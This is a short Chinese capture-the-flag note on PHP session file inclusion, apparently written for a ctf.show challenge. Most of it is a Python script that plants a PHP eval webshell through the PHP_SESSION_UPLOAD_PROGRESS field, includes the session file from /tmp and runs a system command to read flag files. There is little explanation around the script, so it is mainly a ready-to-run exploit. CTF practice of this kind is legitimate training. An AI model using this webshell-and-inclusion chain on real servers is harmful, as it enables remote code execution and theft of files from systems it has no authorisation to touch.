# session文件包含脚本

## 1、使用条件

* 抓包发现cookie已经有phpsessid，说明可以有session文件包含，因为php会将session以文件的形式储存

## 2、脚本

```
import requests
 
url="http://0a20e55a-c524-4c9c-af7d-985ddb231e12.challenge.ctf.show/"
 
data = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[2]);?>',
    '1': 'localhost/tmp/sess_ctfshow',
    '2': 'system("cat /f*");'
    }
 
file = {
    'file': 'ctfshow'
}
cookies = {
    'PHPSESSID': 'ctfshow'
}
 
response = requests.post(url=url,data=data,files=file,cookies=cookies)
print(response.text)
```

